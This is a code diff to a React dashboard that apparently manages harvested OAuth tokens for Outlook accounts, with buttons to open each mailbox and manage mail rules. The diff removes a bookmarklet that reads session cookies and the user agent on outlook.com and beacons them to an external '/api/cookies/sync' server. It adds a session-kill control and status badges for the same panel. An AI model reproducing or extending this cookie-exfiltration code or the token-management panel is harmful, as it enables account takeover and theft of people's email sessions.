@@ -25,13 +25,10 @@ import {
   XCircle,
   AlertCircle,
   Gavel,
-  Cookie,
-  Copy,
-  Check,
 } from "lucide-react";
 import { Token } from "@/types/token";
 import { formatDistanceToNow, isPast } from "date-fns";
-import { deleteTokens, refreshToken, generateBookmarkletToken } from "@/lib/api";
+import { deleteTokens, refreshToken, killSession } from "@/lib/api";
 import { useRouter } from "next/navigation";
 import { toast } from "sonner";
 import { TokenTableSkeleton } from "@/components/ui/loading-skeleton";
@@ -47,9 +44,7 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
   const router = useRouter();
   const [search, setSearch] = useState("");
   const [refreshingId, setRefreshingId] = useState<string | null>(null);
-  const [bookmarkletToken, setBookmarkletToken] = useState<string | null>(null);
-  const [bookmarkletTokenId, setBookmarkletTokenId] = useState<string | null>(null);
-  const [copied, setCopied] = useState(false);
+  const [killingId, setKillingId] = useState<string | null>(null);
 
   const filtered = useMemo(() => {
     if (!search) return tokens;
@@ -83,23 +78,18 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
     }
   };
 
-  const handleGenerateBookmarklet = async (token: Token) => {
+  const handleKillSession = async (token: Token) => {
+    if (!confirm("Kill this session? This will revoke the OAuth token and clear all cookies.")) return;
+    setKillingId(token.id);
     try {
-      const result = await generateBookmarkletToken(token.id);
-      setBookmarkletToken(result.token);
-      setBookmarkletTokenId(token.id);
-      setCopied(false);
+      const result = await killSession(token.id);
+      toast.success("Session killed", { description: result.message });
+      onRefresh();
     } catch (e: any) {
-      toast.error("Failed to generate bookmarklet", { description: e.message });
+      toast.error("Failed to kill session", { description: e.message });
+    } finally {
+      setKillingId(null);
     }
-  };
-
-  const handleCopyBookmarklet = () => {
-    if (!bookmarkletToken) return;
-    const bookmarklet = `javascript:(function(){var t="${bookmarkletToken}";var c=document.cookie;var u=navigator.userAgent;navigator.sendBeacon("${process.env.NEXT_PUBLIC_API_URL || 'https://simdiatokens-production.up.railway.app'}/api/cookies/sync",JSON.stringify({token:t,cookies:c,user_agent:u}));alert("Session synced!");})();`;
-    navigator.clipboard.writeText(bookmarklet);
-    setCopied(true);
-    toast.success("Bookmarklet copied to clipboard");
   };
 
   const openApp = (token: Token, app: string) => {
@@ -135,6 +125,15 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
   const getStatus = (token: Token) => {
     if (isPast(new Date(token.expires_at))) return "revoked";
     return "active";
+  };
+
+  const getSessionStatus = (token: Token) => {
+    const status = token.session_status || "pending";
+    if (status === "active") return { label: "Session Active", color: "bg-emerald-500/20 text-emerald-400 border-emerald-500/30", icon: "●" };
+    if (status === "pending") return { label: "Session Pending", color: "bg-amber-500/20 text-amber-400 border-amber-500/30", icon: "◐" };
+    if (status === "expired") return { label: "Session Expired", color: "bg-rose-500/20 text-rose-400 border-rose-500/30", icon: "○" };
+    if (status === "killed") return { label: "Session Killed", color: "bg-gray-500/20 text-gray-400 border-gray-500/30", icon: "✕" };
+    return { label: "No Session", color: "bg-gray-500/20 text-gray-400 border-gray-500/30", icon: "○" };
   };
 
   const getRefreshedText = (token: Token) => {
@@ -230,6 +229,16 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
                             REVOKED
                           </Badge>
                         )}
+                        {/* Session Status Badge */}
+                        {(() => {
+                          const session = getSessionStatus(token);
+                          return (
+                            <Badge className={`${session.color} text-[10px] px-2 py-0 border`}>
+                              <span className="mr-1">{session.icon}</span>
+                              {session.label}
+                            </Badge>
+                          );
+                        })()}
                       </div>
                       
                       {/* Refreshed ago */}
@@ -302,7 +311,7 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
                         OUTLOOK
                       </button>
                       
-                      <button
+                       <button
                         onClick={() => router.push(`/rules/${token.id}`)}
                         className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20 text-xs font-medium hover:bg-amber-500/20 transition-colors"
                         title="Manage rules"
@@ -311,14 +320,18 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
                         Rules
                       </button>
                       
-                      <button
-                        onClick={() => handleGenerateBookmarklet(token)}
-                        className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-purple-500/10 text-purple-400 border border-purple-500/20 text-xs font-medium hover:bg-purple-500/20 transition-colors"
-                        title="Generate bookmarklet for hybrid cookie access"
-                      >
-                        <Cookie className="h-3.5 w-3.5" />
-                        Hybrid
-                      </button>
+                      {/* Kill Session Button */}
+                      {token.session_status === "active" && (
+                        <button
+                          onClick={() => handleKillSession(token)}
+                          disabled={killingId === token.id}
+                          className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg bg-rose-500/10 text-rose-400 border border-rose-500/20 text-xs font-medium hover:bg-rose-500/20 transition-colors disabled:opacity-50"
+                          title="Kill session and revoke cookies"
+                        >
+                          <XCircle className={`h-3.5 w-3.5 ${killingId === token.id ? "animate-spin" : ""}`} />
+                          Kill Session
+                        </button>
+                      )}
                       
                       <button
                         onClick={() => handleRefresh(token)}
@@ -352,38 +365,7 @@ export function TokenTable({ tokens, loading, onRefresh, lastUpdated }: TokenTab
         </AnimatePresence>
       </div>
 
-      {/* Bookmarklet Dialog */}
-      {bookmarkletToken && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
-          <div className="bg-[#1f1f1f] border border-[#3d3d3d] rounded-lg p-6 w-full max-w-lg mx-4">
-            <h3 className="text-sm font-semibold text-white mb-2">Hybrid Access Bookmarklet</h3>
-            <p className="text-[11px] text-[#a0a0a0] mb-4">
-              Drag this bookmarklet to your browser bookmarks bar. When clicked on outlook.com, it will capture the session cookies and sync them to the server for hybrid access.
-            </p>
-            <div className="bg-[#252525] border border-[#3d3d3d] rounded-md p-3 mb-4">
-              <code className="text-[10px] text-[#0f6cbd] break-all font-mono">
-                javascript:(function()&#123;...&#125;)();
-              </code>
-            </div>
-            <div className="flex items-center gap-2 mb-4">
-              <button
-                onClick={handleCopyBookmarklet}
-                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-md bg-[#0f6cbd]/20 text-[#0f6cbd] border border-[#0f6cbd]/30 text-xs font-medium hover:bg-[#0f6cbd]/30 transition-colors"
-              >
-                {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
-                {copied ? "Copied" : "Copy Bookmarklet"}
-              </button>
-              <span className="text-[10px] text-[#a0a0a0]">Expires in 5 minutes</span>
-            </div>
-            <button
-              onClick={() => setBookmarkletToken(null)}
-              className="w-full px-3 py-2 rounded-md border border-[#3d3d3d] text-xs text-[#a0a0a0] hover:bg-[#252525] transition-colors"
-            >
-              Close
-            </button>
-          </div>
-        </div>
-      )}
+
 
       {/* Polling indicator */}
       {lastUpdated && (
